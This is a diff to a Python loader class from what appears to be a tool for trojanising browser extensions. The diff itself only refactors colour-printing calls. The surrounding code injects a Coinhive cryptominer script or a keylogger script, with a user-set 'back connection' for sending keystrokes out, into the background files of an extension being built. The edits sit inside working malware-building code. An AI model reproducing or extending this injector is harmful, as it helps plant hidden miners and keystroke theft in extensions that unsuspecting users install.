@@ -10,6 +10,7 @@ class Loader :
 
 		self.module = module
 		self.extension = extension
+		self.color = Colors()
 		
 	def inject(self) :
 
@@ -48,21 +49,21 @@ class Loader :
 
 				modules = "modules/currency/coinhive/coinhive.js" # Javascript file to inject into background
 
-				print((Colors().yellows("[!] Configuration of module {}".format(modules))))
+				print("{} Configuration of module {}".format(self.color.yellows("[!]"), modules))
 
-				apikey = raw_input("{}".format(Colors().status("[+] Set coinhive public key: ")))
-				thread = raw_input("{}".format(Colors().status("[+] Set coinhive threads: ")))
-				autoThreads = raw_input("{}".format(Colors().status("[+] Set coinhive autoThreads: ")))
-				throttle = raw_input("{}".format(Colors().status("[+] Set coinhive throttle: ")))
-				forceASMJS = raw_input("{}".format(Colors().status("[+] Set coinhive forceASMJS: ")))
+				apikey = raw_input("{} Set coinhive public key: ".format(self.color.status("[+]")))
+				thread = raw_input("{} Set coinhive threads: ".format(self.color.status("[+]")))
+				autoThreads = raw_input("{} Set coinhive autoThreads: ".format(self.color.status("[+]")))
+				throttle = raw_input("{} Set coinhive throttle: ".format(self.color.status("[+]")))
+				forceASMJS = raw_input("{} Set coinhive forceASMJS: ".format(self.color.status("[+]")))
 
 				options = "{}{}{}, {}thread:{}, autoThreads:{}, throttle: {}, forceASMJS: {}{}".format('"',apikey,'"',"{",thread, autoThreads, throttle, forceASMJS,"}") # Options
 
 			elif self.module == "keylogger" :
 
 				modules = "modules/keylogger/keylogger.js" # Javascript file to inject into background
-				print((Colors().yellows("[!] Configuration of module {}".format(modules))))
-				connection = raw_input("{}".format(Colors().status("[+] Set the back connection: ")))
+				print("{} Configuration of module {}".format(self.color.yellows("[!]"), modules))
+				connection = raw_input("{} Set the back connection: ".format("[+]"))
 				options = "{}".format(connection)
 				
 			with open(modules, "r") as payload :
@@ -70,7 +71,7 @@ class Loader :
 				payload = payload.replace("_0xacfd[2]", str(options))
 				with open("output/extensions/{}/{}".format(self.extension, path ), "a") as s :
 					s.write(payload)
-					print(Colors().status("[+] Module as been injected {}".format(modules)))
+					print("{} Module as been injected {}".format(self.color.status("[!]"), modules))
 					s.close()
 		except IOError as e:
 			raise e
